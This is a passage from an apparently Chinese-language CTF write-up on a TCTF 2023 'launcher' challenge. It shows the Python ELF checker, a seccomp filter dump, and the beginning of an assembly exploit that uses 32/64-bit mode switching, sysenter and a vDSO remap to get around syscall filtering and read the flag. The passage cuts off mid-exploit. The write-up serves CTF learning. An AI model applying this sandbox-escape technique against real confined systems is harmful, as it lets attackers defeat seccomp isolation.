class="hljs-comment">#!/usr/bin/python3 -u</span><br><br><span class="hljs-keyword">import</span> os, sys, random, subprocess, gmpy2<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha3_256<br><span class="hljs-keyword">from</span> elftools.elf.elffile <span class="hljs-keyword">import</span> ELFFile<br><span class="hljs-keyword">from</span> elftools.elf.constants <span class="hljs-keyword">import</span> P_FLAGS<br><br>os.chdir(os.path.dirname(__file__))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proof_of_work</span>(<span class="hljs-params">sec = <span class="hljs-number">10</span></span>):<br>    <span class="hljs-comment"># From 0CTF/TCTF 2021</span><br>    p = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    q = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    n = p*q<br>    c = <span class="hljs-number">2900000</span><br>    t = c*sec + random.randint(<span class="hljs-number">0</span>,c)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Show me your computation:&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;2^(2^<span class="hljs-subst">&#123;t&#125;</span>) mod <span class="hljs-subst">&#123;n&#125;</span> = ?&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your answer: &#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        sol = <span class="hljs-built_in">int</span>(sys.stdin.readline())<br>        phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>        u = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, t, phi)<br>        w = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, u, n)<br>        <span class="hljs-keyword">if</span> w == sol:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Correct!&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wrong Answer!&#x27;</span>)<br>            exit()<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid Input!&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_bytes</span>(<span class="hljs-params">data, b</span>):<br>    p = -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = data.find(b, p+<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> p == -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">elif</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0xfff</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_segments</span>(<span class="hljs-params">elf</span>):<br>    <span class="hljs-keyword">for</span> seg <span class="hljs-keyword">in</span> elf.iter_segments():<br>        <span class="hljs-keyword">if</span> seg.header.p_filesz &gt; <span class="hljs-number">0x10000</span> <span class="hljs-keyword">or</span> seg.header.p_memsz &gt; <span class="hljs-number">0x10000</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Segment too large&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_INTERP&#x27;</span> <span class="hljs-keyword">or</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_DYNAMIC&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No dynamic link&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_LOAD&#x27;</span> <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_W <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_X:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;W^X&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_GNU_STACK&#x27;</span> <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_X:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No executable stack&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_elf</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">0x40</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data.startswith(<span class="hljs-string">b&#x27;\x7fELF\x02\x01\x01&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">9</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid ELF Magic&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\xcd\x80&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;\x0f\x05&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\xcd&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x80&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x0f&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x05&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    elf = ELFFile(BytesIO(data))<br>    <span class="hljs-keyword">if</span> ((elf.header.e_type != <span class="hljs-string">&#x27;ET_EXEC&#x27;</span> <span class="hljs-keyword">and</span> elf.header.e_type != <span class="hljs-string">&#x27;ET_DYN&#x27;</span>)<br>        <span class="hljs-keyword">or</span> elf.header.e_version != <span class="hljs-string">&#x27;EV_CURRENT&#x27;</span><br>        <span class="hljs-keyword">or</span> elf.header.e_ehsize != <span class="hljs-number">0x40</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phoff != <span class="hljs-number">0x40</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phnum &lt;= <span class="hljs-number">0</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phnum &gt;= <span class="hljs-number">100</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> check_segments(elf)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        size = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Size of your ELF: &#x27;</span>))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> size &lt;= <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> size &gt; <span class="hljs-number">0x10000</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ELF File:&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        data = sys.stdin.buffer.read(size)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) != size:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Received: %d bytes&#x27;</span> % <span class="hljs-built_in">len</span>(data))<br>    <span class="hljs-keyword">if</span> check_elf(data):<br>        filename = sha3_256(data).hexdigest()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;File Hash: <span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>)<br>        path = <span class="hljs-string">f&#x27;./data/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span><br>        <span class="hljs-keyword">if</span> os.path.exists(path):<br>            os.unlink(path)<br>        <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;wb&#x27;</span>).write(data)<br>        os.chmod(path, <span class="hljs-number">0o555</span>)<br>        <span class="hljs-keyword">try</span>:<br>            p = subprocess.Popen([<span class="hljs-string">&#x27;docker&#x27;</span>, <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;-i&#x27;</span>, <span class="hljs-string">&#x27;--rm&#x27;</span>, <span class="hljs-string">&#x27;-v&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;path&#125;</span>:/chroot/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;tctf/launcher64:2023&#x27;</span>, filename], stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)<br>            p.wait()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Return status: %d&#x27;</span> % p.returncode)<br>            <span class="hljs-keyword">if</span> p.returncode == <span class="hljs-number">137</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Output:&#x27;</span>)<br>                sys.stdout.buffer.write(p.stdout.read())<br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Something went wrong!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> proof_of_work():<br>        main()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bye!&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>不同：</p><ul><li>禁止段表项数大于100</li><li>禁止GNU_STACK段有x权限</li></ul><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x1b</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) <span class="hljs-keyword">goto</span> <span class="hljs-number">0029</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &lt; <span class="hljs-number">0x40000000</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x22</span> <span class="hljs-number">0xffffffff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0xffffffff</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == close) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1f</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000000b</span>  <span class="hljs-keyword">if</span> (A == munmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1e</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000000c</span>  <span class="hljs-keyword">if</span> (A == brk) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1d</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003c</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1c</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000e7</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00000009</span>  <span class="hljs-keyword">if</span> (A != mmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0015</span><br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000024</span>  A = prot &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># mmap(addr, len, prot, flags, fd, pgoff)</span><br> <span class="hljs-number">0012</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x1a</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0013</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000020</span>  A = prot <span class="hljs-meta"># mmap(addr, len, prot, flags, fd, pgoff)</span><br> <span class="hljs-number">0014</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x17</span> <span class="hljs-number">0x18</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x2</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0015</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A != execve) <span class="hljs-keyword">goto</span> <span class="hljs-number">0020</span><br> <span class="hljs-number">0016</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000014</span>  A = filename &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># execve(filename, argv, envp)</span><br> <span class="hljs-number">0017</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x15</span> <span class="hljs-number">0x00007fff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x7fff</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0018</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  A = filename <span class="hljs-meta"># execve(filename, argv, envp)</span><br> <span class="hljs-number">0019</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x12</span> <span class="hljs-number">0x13</span> <span class="hljs-number">0xffffefe5</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0xffffefe5</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0020</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x12</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A != open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0021</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000014</span>  A = filename &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0022</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x10</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0023</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  A = filename <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0024</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0e</span> <span class="hljs-number">0x00031337</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x31337</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0025</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000001c</span>  A = flags &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0026</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0c</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0027</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000018</span>  A = flags <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0028</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x0a</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0029</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0030</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0031</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0032</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0033</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0034</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000002d</span>  <span class="hljs-keyword">if</span> (A == brk) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0035</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000005a</span>  <span class="hljs-keyword">if</span> (A == mmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0036</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000005b</span>  <span class="hljs-keyword">if</span> (A == munmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0037</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A != exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0038</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br> <span class="hljs-number">0039</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL<br></code></pre></td></tr></table></figure><ul><li>64位<ul><li>mmap只写段</li><li>open &amp;filename &#x3D;&#x3D; 0x31337</li></ul></li><li>32位：read，write，mmap</li></ul><h3 id="sysenter-1"><a href="#sysenter-1" class="headerlink" title="sysenter"></a>sysenter</h3><p>顺着exp捋一遍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; compile with: nasm -f elf64 exp.s -o exp.o &amp;&amp; ld exp.o -e _start -o exp -T linker.ld<br><br>global      _start<br>section     .text exec<br>BITS 32<br><br>    ; align 0x1000<br>vdso_landing:<br>; sysenter will use sysexit to return to some place in vsdo<br>; because is in 32bit, high 32bit will be clear<br>; we setup a soft landing place at the start of elf<br>; then mmap elf to vdso address<br>    times 4096 db 0x90      ; nop padding<br>    pop     ebp<br>    pop     edx<br>    pop     ecx<br>    ret<br><br>    ; lea     esp, [stack]<br>    ; mov     esp, stack<br><br>retf_to_64:<br>    push    0x33            ; cs<br>    push    edi             ; ip<br>    retf                    ; jump to edi (64bit)<br><br>_sysenter:<br>    push    ecx             ; push   ecx<br>    push    edx             ; push   edx<br>    push    ebp             ; push   ebp<br>    mov     ebp, esp<br>    sysenter<br><br>start_32:<br>mmap_elf_to_vdso:<br>    push    0x1000          ; off: 0x1000 : .text start<br>    push    4               ; fd: 4, elf file<br>    push    0x11            ; flags: MAP_FIXED | MAP_SHARED<br>    push    5               ; prot: RX<br>    push    0x4000          ; length: elf size<br>    push    edx             ; addr: vdso return addr &amp;&amp; elf base<br>    mov     ebx, esp<br>    mov     eax, 0x5a       ; mmap<br>    call    _sysenter<br>read_flag:<br>    mov     eax, 3          ; SYS_read (32bit)<br>    mov     ebx, 3          ; fd: flag<br>    mov     ecx, 0x31337    ; buf<br>    mov     edx, 0x1000     ; count<br>    call    _sysenter<br>write_flag_to_stdout:<br>mov     edx, eax        ; count<br>    mov     eax, 4          ; SYS_write (32bit)<br>    mov     ebx, 1          ; fd: STDOUT<br>    mov     ecx, 0x31337    ; buf<br>    call    _sysenter<br>exit_137:<br>    mov     eax, 1          ; SYS_exit (32bit)<br>    mov     ebx, 137        ; error_code<br>    call    _sysenter<br><br>BITS 64<br><br>; copy string at rsi to rdi, no return value<br>strcpy:<br>    cld<br>cpy1:<br>    lodsb<br>    stosb<br>    test al,al<br>    jne cpy1<br>    ret<br><br>retf_to_32:<br>; switch to 32 bit<br>    push    0x23            ; cs<br>    push    rdi             ; ip<br>    retfq                   ; jump to rdi<br><br>_start:<br>find_elf_name:<br>    mov     r13, [rsp+8] ; argv[0]<br><br>; find vdso address on stack<br>    mov rdi, rsp<br>find_vdso_l1:<br>    cmp     QWORD 